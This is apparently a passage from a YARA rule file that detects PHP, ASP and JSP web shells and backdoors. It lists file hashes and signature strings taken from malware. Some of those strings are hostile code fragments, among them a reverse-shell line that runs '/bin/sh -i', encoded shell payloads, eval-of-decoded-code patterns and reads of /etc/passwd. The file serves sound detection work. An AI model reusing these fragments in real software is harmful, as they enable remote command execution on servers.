$s3 = "If ProxyData <> \"\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \"<br />\")"
condition:
all of them
}
rule SSC_r57shell {
meta:
description = "Webshells Auto-generated - file r57shell.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "8023394542cddf8aee5dec6072ed02b5"
strings:
$s11 = " $_POST['cmd']=\"echo \\\"Now script try connect to"
condition:
all of them
}
rule SSC_HYTop_DevPack_2005Red {
meta:
description = "Webshells Auto-generated - file 2005Red.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "d8ccda2214b3f6eabd4502a050eb8fe8"
strings:
$s0 = "scrollbar-darkshadow-color:#FF9DBB;"
$s3 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
$s9 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
condition:
all of them
}
rule SSC_webshell_000_403_c5_config_myxx_queryDong_spyjsp2010_zend {
meta:
description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, config.jsp, myxx.jsp, queryDong.jsp, spyjsp2010.jsp, zend.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
hash1 = "059058a27a7b0059e2c2f007ad4675ef"
hash2 = "8b457934da3821ba58b06a113e0d53d9"
hash3 = "d44df8b1543b837e57cc8f25a0a68d92"
hash4 = "e0354099bee243702eb11df8d0e046df"
hash5 = "90a5ba0c94199269ba33a58bc6a4ad99"
hash6 = "655722eaa6c646437c8ae93daac46ae0"
hash7 = "591ca89a25f06cf01e4345f98a22845c"
strings:
$s0 = "return new Double(format.format(value)).doubleValue();" fullword
$s5 = "File tempF = new File(savePath);" fullword
$s9 = "if (tempF.isDirectory()) {" fullword
condition:
2 of them
}
rule SSC_webshell_shell_phpspy_2006_arabicspy {
meta:
description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "791708057d8b429d91357d38edf43cc0"
hash1 = "40a1f840111996ff7200d18968e42cfe"
hash2 = "e0202adff532b28ef1ba206cf95962f2"
strings:
$s0 = "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype"
$s8 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"P"
condition:
all of them
}
rule SSC_nstview_nstview {
meta:
description = "Webshells Auto-generated - file nstview.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "3871888a0c1ac4270104918231029a56"
strings:
$s4 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");"
condition:
all of them
}
rule SSC_webshell_jsp_inback3 {
meta:
description = "Web Shell - file inback3.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "ea5612492780a26b8aa7e5cedd9b8f4e"
strings:
$s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application"
condition:
all of them
}
rule SSC_webshell_jsp_k81 {
meta:
description = "Web Shell - file k81.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "41efc5c71b6885add9c1d516371bd6af"
strings:
$s1 = "byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);" fullword
$s9 = "if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}" fullword
condition:
1 of them
}
rule SSC_WebShell_Generic_PHP_11 {
meta:
description = "PHP Webshells Github Archive - from files rootshell.php, Rootshell.v.1.0.php, s72 Shell v1.1 Coding.php, s72_Shell_v1.1_Coding.php"
author = "Florian Roth"
super_rule = 1
hash0 = "31a82cbee8dffaf8eb7b73841f3f3e8e9b3e78cf"
hash1 = "838c7191cb10d5bb0fc7460b4ad0c18c326764c6"
hash2 = "8dfcd919d8ddc89335307a7b2d5d467b1fd67351"
hash3 = "80aba3348434c66ac471daab949871ab16c50042"
strings:
$s5 = "$filename = $backupstring.\"$filename\";" fullword
$s6 = "while ($file = readdir($folder)) {" fullword
$s7 = "if($file != \".\" && $file != \"..\")" fullword
$s9 = "$backupstring = \"copy_of_\";" fullword
$s10 = "if( file_exists($file_name))" fullword
$s13 = "global $file_name, $filename;" fullword
$s16 = "copy($file,\"$filename\");" fullword
$s18 = "<td width=\"49%\" height=\"142\">" fullword
condition:
all of them
}
rule SSC_WebShell_GFS {
meta:
description = "PHP Webshells Github Archive - from files GFS web-shell ver 3.1.7 - PRiV8.php, Predator.php, GFS_web-shell_ver_3.1.7_-_PRiV8.php"
author = "Florian Roth"
super_rule = 1
hash0 = "c2f1ef6b11aaec255d4dd31efad18a3869a2a42c"
hash1 = "34f6640985b07009dbd06cd70983451aa4fe9822"
hash2 = "d25ef72bdae3b3cb0fc0fdd81cfa58b215812a50"
strings:
$s0 = "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";" fullword
$s1 = "lIENPTk47DQpleGl0IDA7DQp9DQp9\";" fullword
$s2 = "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShm"
condition:
all of them
}
rule SSC_webshell_ghost_source_icesword_silic {
meta:
description = "Web Shell - from files ghost_source.php, icesword.php, silic.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "cbf64a56306c1b5d98898468fc1fdbd8"
hash1 = "6e20b41c040efb453d57780025a292ae"
hash2 = "437d30c94f8eef92dc2f064de4998695"
strings:
$s3 = "if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $"
$s6 = "if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST["
condition:
all of them
}
rule SSC_webshell_config_myxx_zend {
meta:
description = "Web Shell - from files config.jsp, myxx.jsp, zend.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "d44df8b1543b837e57cc8f25a0a68d92"
hash1 = "e0354099bee243702eb11df8d0e046df"
hash2 = "591ca89a25f06cf01e4345f98a22845c"
strings:
$s3 = ".println(\"<a href=\\\"javascript:alert('You Are In File Now ! Can Not Pack !');"
condition:
all of them
}
rule SSC_php_anuna
{
meta:
author      = "Vlad https://github.com/vlad-s"
date        = "2016/07/18"
description = "Catches a PHP Trojan"
strings:
$a = /<\?php \$[a-z]+ = '/
$b = /\$[a-z]+=explode\(chr\(\([0-9]+[-+][0-9]+\)\)/
$c = /\$[a-z]+=\([0-9]+[-+][0-9]+\)/
$d = /if \(!function_exists\('[a-z]+'\)\)/
condition:
all of them
}
rule SSC_webshell_000_403_807_a_c5_config_css_dm_he1p_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_xxx {
meta:
description = "Web Shell - from files 000.jsp, 403.jsp, 807.jsp, a.jsp, c5.jsp, config.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, myxx.jsp, nogfw.jsp, ok.jsp, queryDong.jsp, spyjsp2010.jsp, style.jsp, t00ls.jsp, u.jsp, xia.jsp, zend.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
hash1 = "059058a27a7b0059e2c2f007ad4675ef"
hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
hash4 = "8b457934da3821ba58b06a113e0d53d9"
hash5 = "d44df8b1543b837e57cc8f25a0a68d92"
hash6 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
hash7 = "14e9688c86b454ed48171a9d4f48ace8"
hash8 = "b330a6c2d49124ef0729539761d6ef0b"
hash9 = "d71716df5042880ef84427acee8b121e"
hash10 = "341298482cf90febebb8616426080d1d"
hash11 = "29aebe333d6332f0ebc2258def94d57e"
hash12 = "42654af68e5d4ea217e6ece5389eb302"
hash13 = "88fc87e7c58249a398efd5ceae636073"
hash14 = "4a812678308475c64132a9b56254edbc"
hash15 = "9626eef1a8b9b8d773a3b2af09306a10"
hash16 = "e0354099bee243702eb11df8d0e046df"
hash17 = "344f9073576a066142b2023629539ebd"
hash18 = "32dea47d9c13f9000c4c807561341bee"
hash19 = "90a5ba0c94199269ba33a58bc6a4ad99"
hash20 = "655722eaa6c646437c8ae93daac46ae0"
hash21 = "b9744f6876919c46a29ea05b1d95b1c3"
hash22 = "9c94637f76e68487fa33f7b0030dd932"
hash23 = "6acc82544be056580c3a1caaa4999956"
hash24 = "6aa32a6392840e161a018f3907a86968"
hash25 = "591ca89a25f06cf01e4345f98a22845c"
hash26 = "349ec229e3f8eda0f9eb918c74a8bf4c"
hash27 = "3ea688e3439a1f56b16694667938316d"
hash28 = "ab77e4d1006259d7cbc15884416ca88c"
hash29 = "71097537a91fac6b01f46f66ee2d7749"
hash30 = "2434a7a07cb47ce25b41d30bc291cacc"
hash31 = "7a4b090619ecce6f7bd838fe5c58554b"
strings:
$s0 = "ports = \"21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500\";" fullword
$s1 = "private static class VEditPropertyInvoker extends DefaultInvoker {" fullword
condition:
all of them
}
rule SSC_webshell_cmd_asp_5_1 {
meta:
description = "Web Shell - file cmd-asp-5.1.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "8baa99666bf3734cbdfdd10088e0cd9f"
strings:
$s9 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
condition:
all of them
}
rule SSC_Ajan_asp {
meta:
description = "Semi-Auto-generated  - file Ajan.asp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "b6f468252407efc2318639da22b08af0"
strings:
$s1 = "c:\\downloaded.zip"
$s2 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword
$s3 = "http://www35.websamba.com/cybervurgun/"
condition:
1 of them
}
rule SSC_WebShell_Web_shell__c_ShAnKaR {
meta:
description = "PHP Webshells Github Archive - file Web-shell (c)ShAnKaR.php"
author = "Florian Roth"
hash = "3dd4f25bd132beb59d2ae0c813373c9ea20e1b7a"
strings:
$s0 = "header(\"Content-Length: \".filesize($_POST['downf']));" fullword
$s5 = "if($_POST['save']==0){echo \"<textarea cols=70 rows=10>\".htmlspecialchars($dump"
$s6 = "write(\"#\\n#Server : \".getenv('SERVER_NAME').\"" fullword
$s12 = "foreach(@file($_POST['passwd']) as $fed)echo $fed;" fullword
condition:
2 of them
}
rule SSC_webshell_phpspy2010 {
meta:
description = "Web Shell - file phpspy2010.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "14ae0e4f5349924a5047fed9f3b105c5"
strings:
$s3 = "eval(gzinflate(base64_decode("
$s5 = "//angel" fullword
$s8 = "$admin['cookiedomain'] = '';" fullword
condition:
all of them
}
rule SSC_aZRaiLPhp_v1_0_php {
meta:
description = "Semi-Auto-generated  - file aZRaiLPhp v1.0.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "26b2d3943395682e36da06ed493a3715"
strings:
$s0 = "azrailphp"
$s1 = "<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>"
$s3 = "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>"
condition:
2 of them
}
rule SSC_FSO_s_phvayv_2 {
meta:
description = "Webshells Auto-generated - file phvayv.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "205ecda66c443083403efb1e5c7f7878"
strings:
$s2 = "rows=\"24\" cols=\"122\" wrap=\"OFF\">XXXX</textarea></font><font"
condition:
all of them
}
rule SSC_webshell_Dive_Shell_1_0_Emperor_Hacking_Team_xxx {
meta:
description = "Web Shell - from files Dive Shell 1.0 - Emperor Hacking Team.php, phpshell.php, SimShell 1.0 - Simorgh Security MGZ.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "1b5102bdc41a7bc439eea8f0010310a5"
hash1 = "f8a6d5306fb37414c5c772315a27832f"
hash2 = "37cb1db26b1b0161a4bf678a6b4565bd"
strings:
$s1 = "if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== fals"
$s9 = "if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {" fullword
condition:
all of them
}
rule SSC_webshell_webshell_cnseay02_1 {
meta:
description = "Web Shell - file webshell-cnseay02-1.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "95fc76081a42c4f26912826cb1bd24b1"
strings:
$s0 = "(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU"
condition:
all of them
}
rule SSC_WebShell_php_webshells_MyShell {
meta:
description = "PHP Webshells Github Archive - file MyShell.php"
author = "Florian Roth"
hash = "42e283c594c4d061f80a18f5ade0717d3fb2f76d"
strings:
$s3 = "<title>MyShell error - Access Denied</title>" fullword
$s4 = "$adminEmail = \"youremail@yourserver.com\";" fullword
$s5 = "//A workdir has been asked for - we chdir to that dir." fullword
$s6 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
$s13 = "#$autoErrorTrap Enable automatic error traping if command returns error." fullword
$s14 = "/* No work_dir - we chdir to $DOCUMENT_ROOT */" fullword
$s19 = "#every command you excecute." fullword
$s20 = "<form name=\"shell\" method=\"post\">" fullword
condition:
3 of them
}
rule SSC_webshell_php_404 {
meta:
description = "Web Shell - file 404.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "ced050df5ca42064056a7ad610a191b3"
strings:
$s0 = "$pass = md5(md5(md5($pass)));" fullword
condition:
all of them
}
rule SSC_webshell_drag_system {
meta:
description = "Web Shell - file system.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "15ae237cf395fb24cf12bff141fb3f7c"
strings:
$s9 = "String sql = \"SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_"
condition:
all of them
}
rule SSC_phpbackdoor15_php {
meta:
description = "Semi-Auto-generated  - file phpbackdoor15.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "0fdb401a49fc2e481e3dfd697078334b"
strings:
$s1 = "echo \"fichier telecharge dans \".good_link(\"./\".$_FILES[\"fic\"][\"na"
$s2 = "if(move_uploaded_file($_FILES[\"fic\"][\"tmp_name\"],good_link(\"./\".$_FI"
$s3 = "echo \"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s"
condition:
1 of them
}
rule SSC_webshell_ASP_RemExp {
meta:
description = "Web Shell - file RemExp.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "aa1d8491f4e2894dbdb91eec1abc2244"
strings:
$s0 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Reques"
$s1 = "Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal"
condition:
all of them
}
rule SSC_by064cli {
meta:
description = "Webshells Auto-generated - file by064cli.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "10e0dff366968b770ae929505d2a9885"
strings:
$s7 = "packet dropped,redirecting"
$s9 = "input the password(the default one is 'by')"
condition:
all of them
}
rule SSC_WebShell_php_webshells_matamu {
meta:
description = "PHP Webshells Github Archive - file matamu.php"
author = "Florian Roth"
hash = "d477aae6bd2f288b578dbf05c1c46b3aaa474733"
strings:
$s2 = "$command .= ' -F';" fullword
$s3 = "/* We try and match a cd command. */" fullword
$s4 = "directory... Trust me - it works :-) */" fullword
$s5 = "$command .= \" 1> $tmpfile 2>&1; \" ." fullword
$s10 = "$new_dir = $regs[1]; // 'cd /something/...'" fullword
$s16 = "/* The last / in work_dir were the first charecter." fullword
condition:
2 of them
}
rule SSC_SimAttacker___Vrsion_1_0_0___priv8_4_My_friend_php {
meta:
description = "Semi-Auto-generated  - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "089ff24d978aeff2b4b2869f0c7d38a3"
strings:
$s0 = "SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend"
$s3 = " fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
$s4 = "echo \"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora"
condition:
1 of them
}
rule SSC_WebShell_Generic_PHP_10 {
meta:
description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php, PHPRemoteView.php"
author = "Florian Roth"
super_rule = 1
hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"
hash3 = "7d5b54c7cab6b82fb7d131d7bbb989fd53cb1b57"
strings:
$s2 = "$world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T'; " fullword
$s6 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-'; " fullword
$s11 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-'; " fullword
$s12 = "else if( $mode & 0xA000 ) " fullword
$s17 = "$s=sprintf(\"%1s\", $type); " fullword
$s20 = "font-size: 8pt;" fullword
condition:
all of them
}
rule SSC_rknt_zip_Folder_RkNT {
meta:
description = "Webshells Auto-generated - file RkNT.dll"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "5f97386dfde148942b7584aeb6512b85"
strings:
$s0 = "PathStripPathA"
$s1 = "`cLGet!Addr%"
$s2 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
$s3 = "oQToOemBuff* <="
$s4 = "ionCdunAsw[Us'"
$s6 = "CreateProcessW: %S"
$s7 = "ImageDirectoryEntryToData"
condition:
all of them
}
rule SSC_binder2_binder2 {
meta:
description = "Webshells Auto-generated - file binder2.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "d594e90ad23ae0bc0b65b59189c12f11"
strings:
$s0 = "IsCharAlphaNumericA"
$s2 = "WideCharToM"
$s4 = "g 5pur+virtu!"
$s5 = "\\syslog.en"
$s6 = "heap7'7oqk?not="
$s8 = "- Kablto in"
condition:
all of them
}
rule SSC_u_uay {
meta:
description = "Webshells Auto-generated - file uay.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "abbc7b31a24475e4c5d82fc4c2b8c7c4"
strings:
$s1 = "exec \"c:\\WINDOWS\\System32\\freecell.exe"
$s9 = "SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Security"
condition:
1 of them
}
rule SSC_webshell_Mysql_interface_v1_0 {
meta:
description = "Web Shell - file Mysql interface v1.0.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "a12fc0a3d31e2f89727b9678148cd487"
strings:
$s0 = "echo \"<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\\\"return"
condition:
all of them
}
rule SSC_phvayvv_php_php {
meta:
description = "Semi-Auto-generated  - file phvayvv.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "35fb37f3c806718545d97c6559abd262"
strings:
$s0 = "{mkdir(\"$dizin/$duzenx2\",777)"
$s1 = "$baglan=fopen($duzkaydet,'w');"
$s2 = "PHVayv 1.0"
condition:
1 of them
}
rule SSC_WebShell_b374k_mini_shell_php_php {
meta:
description = "PHP Webshells Github Archive - file b374k-mini-shell-php.php.php"
author = "Florian Roth"
hash = "afb88635fbdd9ebe86b650cc220d3012a8c35143"
strings:
$s0 = "@error_reporting(0);" fullword
$s2 = "@eval(gzinflate(base64_decode($code)));" fullword
$s3 = "@set_time_limit(0); " fullword
condition:
all of them
}
rule SSC_FeliksPack3___PHP_Shells_usr {
meta:
description = "Webshells Auto-generated - file usr.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "ade3357520325af50c9098dc8a21a024"
strings:
$s0 = "<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor"
condition:
all of them
}
rule SSC_webshell_c99_c99shell_c99_c99shell {
meta:
description = "Web Shell - from files c99.php, c99shell.php, c99.php, c99shell.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
hash1 = "d3f38a6dc54a73d304932d9227a739ec"
hash2 = "157b4ac3c7ba3a36e546e81e9279eab5"
hash3 = "048ccc01b873b40d57ce25a4c56ea717"
strings:
$s2 = "$bindport_pass = \"c99\";" fullword
$s5 = " else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = tr"
condition:
1 of them
}
rule SSC_kacak_asp {
meta:
description = "Semi-Auto-generated  - file kacak.asp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "907d95d46785db21331a0324972dda8c"
strings:
$s0 = "Kacak FSO 1.0"
$s1 = "if request.querystring(\"TGH\") = \"1\" then"
$s3 = "<font color=\"#858585\">BuqX</font></a></font><font face=\"Verdana\" style="
$s4 = "mailto:BuqX@hotmail.com"
condition:
1 of them
}
rule SSC_WebShell_safe0ver {
meta:
description = "PHP Webshells Github Archive - file safe0ver.php"
author = "Florian Roth"
hash = "366639526d92bd38ff7218b8539ac0f154190eb8"
strings:
$s3 = "$scriptident = \"$scriptTitle By Evilc0der.com\";" fullword
$s4 = "while (file_exists(\"$lastdir/newfile$i.txt\"))" fullword
$s5 = "else { /* <!-- Then it must be a File... --> */" fullword
$s7 = "$contents .= htmlentities( $line ) ;" fullword
$s8 = "<br><p><br>Safe Mode ByPAss<p><form method=\"POST\">" fullword
$s14 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
$s20 = "/* <!-- End of Actions --> */" fullword
condition:
3 of them
}
rule SSC_DarkSpy105 {
meta:
description = "Webshells Auto-generated - file DarkSpy105.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "f0b85e7bec90dba829a3ede1ab7d8722"
strings:
$s7 = "Sorry,DarkSpy got an unknown exception,please re-run it,thanks!"
condition:
all of them
}
rule SSC_Webshell_AcidPoison {
meta:
description = "Detects Poison Sh3ll - Webshell"
author = "Florian Roth"
reference = "https://github.com/nikicat/web-malware-collection"
date = "2016-01-11"
score = 70
hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
hash3 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
hash4 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
hash5 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
hash6 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
hash7 = "be541cf880a8e389a0767b85f1686443f35b508d1975ee25e1ce3f08fa32cfb5"
hash8 = "be541cf880a8e389a0767b85f1686443f35b508d1975ee25e1ce3f08fa32cfb5"
hash9 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
hash10 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
strings:
$s1 = "elseif ( enabled(\"exec\") ) { exec($cmd,$o); $output = join(\"\\r\\n\",$o); }" fullword ascii
condition:
filesize < 550KB and all of them
}
rule SSC_webshell_r57shell_r57shell127_SnIpEr_SA_Shell_EgY_SpIdEr_ShElL_V2_r57_xxx {
meta:
description = "Web Shell - from files r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, r57.php, Backdoor.PHP.Agent.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "ef43fef943e9df90ddb6257950b3538f"
hash1 = "ae025c886fbe7f9ed159f49593674832"
hash2 = "911195a9b7c010f61b66439d9048f400"
hash3 = "697dae78c040150daff7db751fc0c03c"
hash4 = "513b7be8bd0595c377283a7c87b44b2e"
hash5 = "1d912c55b96e2efe8ca873d6040e3b30"
hash6 = "e5b2131dd1db0dbdb43b53c5ce99016a"
hash7 = "4108f28a9792b50d95f95b9e5314fa1e"
hash8 = "41af6fd253648885c7ad2ed524e0692d"
hash9 = "6fcc283470465eed4870bcc3e2d7f14d"
strings:
$s2 = "echo sr(15,\"<b>\".$lang[$language.'_text58'].$arrow.\"</b>\",in('text','mk_name"
$s3 = "echo sr(15,\"<b>\".$lang[$language.'_text21'].$arrow.\"</b>\",in('checkbox','nf1"
$s9 = "echo sr(40,\"<b>\".$lang[$language.'_text26'].$arrow.\"</b>\",\"<select size="
condition:
all of them
}
rule SSC_Dive_Shell_1_0___Emperor_Hacking_Team_php {
meta:
description = "Semi-Auto-generated  - file Dive Shell 1.0 - Emperor Hacking Team.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "1b5102bdc41a7bc439eea8f0010310a5"
strings:
$s0 = "Emperor Hacking TEAM"
$s1 = "Simshell" fullword
$s2 = "ereg('^[[:blank:]]*cd[[:blank:]]"
$s3 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST"
condition:
2 of them
}
rule SSC_webshell_404_data_suiyue {
meta:
description = "Web Shell - from files 404.jsp, data.jsp, suiyue.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "7066f4469c3ec20f4890535b5f299122"
hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
hash2 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
strings:
$s3 = " sbCopy.append(\"<input type=button name=goback value=' \"+strBack[languageNo]+"
condition:
all of them
}
rule SSC_webshell_webshell_123 {
meta:
description = "Web shells - generated from file webshell-123.php"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "2782bb170acaed3829ea9a04f0ac7218"
strings:
$s0 = "// Web Shell!!" fullword
$s1 = "@preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6"
$s3 = "$default_charset = \"UTF-8\";" fullword
$s4 = "// url:http://www.weigongkai.com/shell/" fullword
condition:
2 of them
}
rule SSC_cmd_asp_5_1_asp {
meta:
description = "Semi-Auto-generated  - file cmd-asp-5.1.asp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "8baa99666bf3734cbdfdd10088e0cd9f"
strings:
$s0 = "Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)" fullword
$s3 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
condition:
1 of them
}
rule SSC_webshell_PHP_404 {
meta:
description = "Web Shell - file 404.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "078c55ac475ab9e028f94f879f548bca"
strings:
$s4 = "<span>Posix_getpwuid (\"Read\" /etc/passwd)"
condition:
all of them
}
rule SSC_WebShell_c99_locus7s {
meta:
description = "PHP Webshells Github Archive - file c99_locus7s.php"
author = "Florian Roth"
hash = "d413d4700daed07561c9f95e1468fb80238fbf3c"
strings:
$s8 = "$encoded = base64_encode(file_get_contents($d.$f)); " fullword
$s9 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y"
$s10 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sq"
$s11 = "$c99sh_sourcesurl = \"http://locus7s.com/\"; //Sources-server " fullword
$s19 = "$nixpwdperpage = 100; // Get first N lines from /etc/passwd " fullword
condition:
2 of them
}
rule SSC_WebShell_JspWebshell_1_2 {
meta:
description = "PHP Webshells Github Archive - file JspWebshell_1.2.php"
author = "Florian Roth"
hash = "0bed4a1966117dd872ac9e8dceceb54024a030fa"
strings:
$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
$s1 = "String password=request.getParameter(\"password\");" fullword
$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
$s7 = "String editfile=request.getParameter(\"editfile\");" fullword
$s8 = "//String tempfilename=request.getParameter(\"file\");" fullword
$s12 = "password = (String)session.getAttribute(\"password\");" fullword
condition:
3 of them
}
rule SSC_WebShell__CrystalShell_v_1_sosyete_stres {
meta:
description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, sosyete.php, stres.php"
author = "Florian Roth"
super_rule = 1
hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
hash1 = "e32405e776e87e45735c187c577d3a4f98a64059"
hash2 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"
strings:
$s1 = "A:visited { COLOR:blue; TEXT-DECORATION: none}" fullword
$s4 = "A:active {COLOR:blue; TEXT-DECORATION: none}" fullword
$s11 = "scrollbar-darkshadow-color: #101842;" fullword
$s15 = "<a bookmark=\"minipanel\">" fullword
$s16 = "background-color: #EBEAEA;" fullword
$s18 = "color: #D5ECF9;" fullword
$s19 = "<center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 border"
condition:
all of them
}
